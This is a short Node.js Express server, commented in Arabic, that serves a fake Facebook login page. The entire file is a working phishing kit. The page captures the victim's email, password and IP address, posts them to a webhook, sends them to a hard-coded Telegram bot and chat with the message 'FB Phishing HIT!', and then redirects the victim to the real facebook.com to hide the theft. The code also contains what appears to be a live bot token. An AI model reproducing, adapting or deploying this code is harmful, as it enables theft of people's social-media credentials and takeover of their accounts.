const express = require('express');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
app.use(express.json());

// 👈 غيّر برقمك الحقيقي
const token = 'AAGxkQ9zpE_Lpn_ZmE5R8daajPHvJWbR5co';
const chatId = '8553651560';
const bot = new TelegramBot(token, { polling: true });

// الصفحة الرئيسية
app.get('/', (req, res) => {
  res.send(`
    <h1>✅ FB Bot شغال!</h1>
    <a href="/fb">اختبر صفحة FB</a>
    <p>Webhook: /fbhook</p>
  `);
});

// صفحة FB المزيفة
app.get('/fb', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html dir="rtl">
<head>
<title>Facebook - تسجيل الدخول</title>
<meta charset="UTF-8">
<style>
body{font-family:SFProDisplay,Helvetica,Arial,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;margin:0;padding:20px}
.card{background:white;max-width:400px;width:100%;padding:40px;border-radius:12px;box-shadow:0 20px 40px rgba(0,0,0,0.1)}
.logo{width:180px;margin:0 auto 30px;display:block}
.input-group{position:relative;margin-bottom:20px}
input{width:100%;padding:16px 20px;border:2px solid #e1e5e9;border-radius:8px;font-size:16px;box-sizing:border-box;transition:border-color 0.3s}
input:focus{border-color:#1877f2;outline:none}
.btn{width:100%;padding:16px;background:#1877f2;color:white;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;transition:background 0.3s}
.btn:hover{background:#166fe5}
</style>
</head>
<body>
<div class="card">
<img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHw8.svg" alt="Facebook" class="logo">
<div class="input-group">
<input id="email" type="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
</div>
<div class="input-group">
<input id="pass" type="password" placeholder="كلمة السر" required>
</div>
<button class="btn" onclick="capture()">تسجيل الدخول</button>
</div>
<script>
async function capture(){
  const data = {
    email: document.getElementById('email').value,
    pass: document.getElementById('pass').value,
    ip: await (await fetch('https://api.ipify.org')).text()
  };
  await fetch('/fbhook', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(data)
  });
  window.location.href = 'https://facebook.com';
}
</script>
</body></html>`);
});

// استقبال البيانات
app.post('/fbhook', async (req, res) => {
  const { email, pass, ip } = req.body;
  await bot.sendMessage(chatId, 
    `🎣 FB Phishing HIT!\n\n` +
    `📧 Email: ${email}\n` +
    `🔑 Password: ${pass}\n` +
    `🌐 IP: ${ip}\n` +
    `⏰ ${new Date().toLocaleString('ar')}`
  );
  res.json({ok: true});
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
  console.log(`✅ Server on port ${port}`);
});
